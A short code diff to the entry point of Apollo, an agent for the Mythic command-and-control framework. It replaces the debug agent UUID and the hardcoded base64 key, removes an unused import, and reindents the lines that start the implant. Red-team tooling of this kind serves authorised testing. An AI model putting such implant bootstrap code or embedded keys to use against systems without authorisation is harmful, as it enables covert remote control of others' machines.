@@ -11,7 +11,6 @@
 using IPC;
 using Mythic.C2Profiles;
 using System;
-using System.IO;
 using System.IO.Pipes;
 using System.Linq;
 using System.Runtime.Serialization.Formatters.Binary;
@@ -23,7 +22,7 @@ namespace Apollo
     {
 
 #if DEBUG
-        public static string AgentUUID = "8e896559-d770-415b-9635-661afc573053";
+        public static string AgentUUID = "b1ba8044-eb2b-4767-b2da-17d3d8e69171";
 #endif
 
         [STAThread]
@@ -39,7 +38,7 @@ namespace Apollo
             }
             else
             {
-                profile = new DefaultProfile(AgentUUID, "kZvIrF5VJ4mOlmm+tzDpFttLskTlRyC1hZoJzzFZKqs=");
+                profile = new DefaultProfile(AgentUUID, "Ybza2pWN6Nh33lqwhGPqW1bT4ebzaBXG8sy2D86ZzeM=");
             }
 #else
             DefaultProfile profile = new DefaultProfile();
@@ -53,10 +52,10 @@ namespace Apollo
 #else
 #error NO VALID EGRESS PROFILE SELECTED
 #endif
-            Agent implant = new Agent(profile);
-            implant.Start();
-            
-	    }
+
+               Agent implant = new Agent(profile);
+               implant.Start();
+        }
     }
 
 }
